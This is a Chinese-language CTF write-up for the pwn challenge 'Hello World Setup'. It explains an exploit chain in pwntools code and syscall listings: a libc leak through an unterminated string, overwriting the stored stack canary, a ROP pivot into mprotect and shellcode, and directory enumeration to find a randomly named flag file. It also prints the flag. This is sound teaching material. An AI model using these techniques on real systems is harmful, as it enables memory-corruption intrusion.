# Hello World Setup

## 题目简述

这是一个启用栈保护与 seccomp 的 64 位安装程序，随题给出 glibc 2.34、动态加载器和 `libseccomp`。flag 文件名被随机化，不能直接硬编码 `flag.txt`。官方利用分为两步：先借字符串越界读取泄露 libc 并修改原始 canary，再获得足够长的栈输入，执行 `mprotect`、目录枚举和文件读取。

## 解题过程

第一阶段利用 `read` 不自动补 `\0` 的性质。先在目标缓冲区写满 `0x18` 个 `A`，再次进入相同菜单后让程序按 C 字符串打印；输出会越过缓冲区，直到相邻的 `sleep` 相关地址中出现零字节。

```python
io.sendlineafter(b"> ", b"1")
io.sendafter(b"to: ", b"A" * 0x18)
io.sendlineafter(b"> ", b"1")

io.recvuntil(b"A" * 0x18)
leak = u64(io.recvline()[:6].ljust(8, b"\0"))
libc.address = leak - 0xed88e
original_canary = libc.address - 0x2898
```

本题环境中，栈保护值的原始存放位置与 libc 基址保持固定相对偏移。安装器后续的写入路径允许把该地址作为目标，使原始 canary 被改成与下一阶段负载一致的值。这样函数尾部比较的两边同时受控，可以通过 `__stack_chk_fail` 检查，而不需要猜 canary。

通过检查后，初始可控返回链空间只够放少量地址。利用脚本设置：

```text
rax = 0
rdi = 0
rdx = 0xffffffff
rsi = 当前栈附近
syscall
```

执行一次大尺寸 `read`，把后续完整 ROP 链送到栈上。已知 libc 基址后，可以直接使用 `pop rax`、`pop rdi`、`pop rsi`、`pop rdx` 和 `syscall`：

1. `mprotect(libc_base + 0x21a000, 0x1000, 7)` 把一页 libc 数据区改为 RWX；
2. `read(0, libc_base + 0x21a800, 0x1000)` 写入 shellcode；
3. 返回到 `libc_base + 0x21a800` 执行。

flag 文件名未知，因此 shellcode 先枚举当前目录。官方代码用 `int 0x80` 的 32 位兼容 ABI 调用：

```text
mmap2(0x500000, 0x5000, RW, ...)
open(".", O_RDONLY)
getdents(fd, 0x500a00, 0x1337)
```

先用 `mmap2` 获得低于 4 GB 的可写地址，避免 32 位指针截断。随后从 `getdents` 返回的目录项中定位随机 `.txt` 文件名，再打开该文件；读取和输出阶段切回 64 位 `syscall`：

```text
open(random_name, O_RDONLY)
read(fd, buffer, 0x100)
write(1, buffer, 0x100)
```

仓库中的随机 flag 文件为 `85c6ead8489c814ccc024c7054edf8e4.txt`，内容是：

```text
SEKAI{JusT_4_B@s1C_h3Ll0_W@rlD_aa5dab0c72a98a522d48cfe43944d41e}
```

## 方法总结

这条利用链分别解决了三道限制：非终止字符串提供 libc 泄露，改写 canary 的原始副本绕过栈保护，短 ROP 再引导一次大 `read` 扩展成完整利用。随机 flag 文件名要求在 shellcode 内做目录枚举；混用 32 位 `int 0x80` 时，还必须先把工作区映射到低地址。
